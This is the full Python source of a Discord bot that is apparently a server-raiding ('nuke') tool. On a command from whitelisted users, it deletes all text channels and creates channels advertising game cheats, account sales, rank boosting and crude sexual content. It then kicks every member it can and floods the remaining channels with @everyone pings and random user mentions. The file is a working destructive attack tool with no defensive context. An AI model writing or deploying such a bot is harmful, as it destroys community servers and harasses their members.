from discord.ext import commands
import discord
import asyncio
import random

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=["!",""],intents=intents)

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    else:
        bot_author = "name1","name2","name3"
        if not message.author.name in bot_author:
            return
        else:
            if message.content.startswith("guild_spam"):

                if message.content.split()[1] == "ID":
                    print(message.content.split()[2])
                    guild_name = bot.get_guild(int(message.content.split()[2]))
                    print(guild_name)
                else:
                    print(message.content.split()[1])
                    guild_name = discord.utils.get(bot.guilds, name=str(message.content.split()[1]))
                    print(guild_name)
                channel_delete_err = 0
                channel_delete = 0
                for T in range(0,len (guild_name.text_channels)):
                    try:
                        await guild_name.text_channels[T].delete()
                        print(f"{guild_name.text_channels[T]}delete")
                        channel_delete = channel_delete + 1
                    except:
                        print(f"{channel_delete_err} チャンネル削除失敗")
                        channel_delete_err = channel_delete_err + 1
                        pass
                print(f"channel delete,{channel_delete}")
                try:
                    category_count_err = 0
                    await guild_name.create_text_channel("初鯖チム10")
                    await guild_name.create_text_channel("原神リーク")
                    await guild_name.create_text_channel("原神チート販売")
                    await guild_name.create_text_channel("原神アカウント販売")
                    await guild_name.create_text_channel("原神課金代行")
                    await guild_name.create_text_channel("ポジ種ヤバ交尾会場")
                    await guild_name.create_text_channel("ゲイ界隈")
                    await guild_name.create_text_channel("APEX談合")
                    await guild_name.create_text_channel("APEXチート販売")
                    await guild_name.create_text_channel("ランク")
                    await guild_name.create_text_channel("アリーナ談合")
                    await guild_name.create_text_channel("ランク代行")
                    await guild_name.create_text_channel("爪ダブ代行")
                except:
                    category_count_err = category_count_err + 1
                    print(f"ERROR{category_count_err}")
                    pass
                await asyncio.sleep(2)
                kick_error = 0
                kick_pass = 0
                for U in range(0,len (guild_name.members)):
                    try:
                        await guild_name.members[U].kick()
                        print(f"kick ~ {guild_name.members[U]} err>{kick_error}")
                        kick_pass = kick_pass + 1
                    except:
                        kick_error = kick_error + 1
                        print(f"{kick_error}ERROR")
                        pass
                count = 0
                error_count = 0
                while count<100:

                    for G in range(0, len(guild_name.text_channels)):
                        try:
                            user = random.choice(guild_name.members)
                            await guild_name.text_channels[G].send(f"@everyone {user.mention}")
                            print(guild_name.text_channels[G],user,count)
                            count = count + 1
                        except:
                            print(f"error:{error_count}")
                            count = count + 1
                            error_count = error_count + 1
                            pass

                print(f"{str(guild_name)}|{count}回中{count - error_count}回成功\n")
                await message.author.send(f"{str(guild_name)}**__{count}__**回中**__{count - error_count}__回**成功\nmember_kick({kick_pass})\n消去したチャンネル数{channel_delete}\nチャンネル生成数{13 - category_count_err}")


bot.run("TOKEN")
